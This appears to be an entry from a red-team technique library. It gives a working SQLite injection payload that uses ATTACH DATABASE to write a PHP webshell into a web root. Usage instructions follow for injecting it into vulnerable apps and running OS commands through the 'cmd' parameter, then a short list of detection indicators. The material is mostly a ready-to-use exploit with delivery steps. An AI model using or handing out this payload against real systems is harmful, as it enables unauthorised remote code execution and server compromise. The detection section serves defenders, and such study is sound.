---
id: 6ea83547-2e40-43bc-9e12-099aa0c5719b
type: code
language: SQL
verified: true
created_at: '2023-04-06T03:56:37.150447+00:00'
updated_at: '2023-10-01T00:00:00.000000+00:00'
platforms:
  - Web
  - Linux
tags:
  - sqli
  - rce
  - webshell
validated: true
---

# SQLite-Attach-Database-to-Create-PHP-Webshell

## Code

```sql
ATTACH DATABASE '/var/www/lol.php' AS lol;
CREATE TABLE lol.pwn (dataz text);
INSERT INTO lol.pwn (dataz) VALUES ("<?php system($_GET['cmd']); ?>");--
```

## Description

This SQL code snippet exploits SQLite injection to attach an external file as a database (creating a PHP file in a web directory), define a table, and insert PHP code that functions as a basic webshell. When the PHP file is accessed via HTTP with a 'cmd' parameter, it executes the specified OS command using PHP's system() function.

## Parameters

| Variable | Description | Example |
|----------|-------------|---------|
| '/var/www/lol.php' | Path to the target file for the webshell (must be writable by the DB process) | '/var/www/shell.php' |
| 'cmd' | GET parameter for commands in PHP execution | 'ls -la' |

## Usage

Inject this code into a vulnerable SQLite query parameter in a web app (e.g., via POST data in a form). After injection, access http://target.com/lol.php?cmd=command to execute OS commands. Used in red team engagements for initial RCE on PHP/SQLite apps. Deliver via tools like Burp Suite or curl.

## Detection

- Monitor SQLite query logs for ATTACH DATABASE or unusual INSERTs with PHP code.
- Web server access logs showing requests to unusual .php files or with 'cmd' parameters.
- File system scans for new PHP files in web roots containing system() calls.
- IDS/IPS signatures for SQL injection patterns or anomalous command executions.

## Related

- [[procedures/SQLite-Injection-for-RCE-via-Attach-Database]]
